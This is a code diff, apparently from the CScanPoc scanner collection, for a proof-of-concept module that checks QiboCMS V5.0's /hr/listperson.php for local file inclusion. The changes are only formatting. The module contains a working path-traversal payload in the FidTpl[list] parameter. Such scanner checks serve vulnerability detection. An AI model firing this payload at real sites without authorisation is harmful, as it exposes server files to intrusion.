@@ -3,8 +3,9 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'QiboCMS_0004' # 平台漏洞编号，留空
+    vuln_id = 'QiboCMS_0004'  # 平台漏洞编号，留空
     name = 'QiboCMS V5.0 /hr/listperson.php 本地文件包含漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.LFI  # 漏洞类型
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
     product_version = 'V5.0'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'b2c94fda-5b26-467a-9253-38e096f51011'
     author = '47bwy'  # POC编写者
@@ -30,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #References:  http://www.wooyun.org/bugs/wooyun-2015-081470
+
+            # References:  http://www.wooyun.org/bugs/wooyun-2015-081470
             payload = "FidTpl[list]=../images/default/default.js"
             file_path = "/hr/listperson.php?%s" % payload
             url = self.target + file_path
@@ -48,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
